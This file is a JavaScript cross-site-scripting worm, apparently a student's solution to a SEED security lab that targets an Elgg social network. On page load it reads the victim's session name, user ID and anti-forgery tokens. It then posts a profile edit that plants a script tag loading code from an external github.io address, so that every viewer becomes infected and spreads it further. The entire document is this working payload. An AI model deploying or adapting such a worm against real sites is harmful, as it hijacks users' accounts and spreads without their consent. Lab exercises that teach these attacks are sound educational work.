window.onload = function(){
    // JavaScript code to access user name, user guid, Time Stamp __elgg_ts, and Security Token __elgg_token
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // The worm payload: This code will be injected into the victim's "About Me" section
    var wormCode = "<script src="https://arminruckstuhl.github.io/CYBR271_Assignment3/script2.js"></script>";

    // Construct the content of your URL, updating the "About Me" field with the worm code
    var content = token + ts + userName + "&description=" + encodeURIComponent("Samy waz here! " + wormCode) + "&accesslevel[description]=2" + guid;

    var samyGuid = 59; // Samy's user ID

    // Send the request to modify the profile only if the current user is not Samy
    if(elgg.session.user.guid != samyGuid) {
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", "http://www.seed-server.com/action/profile/edit", true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
};
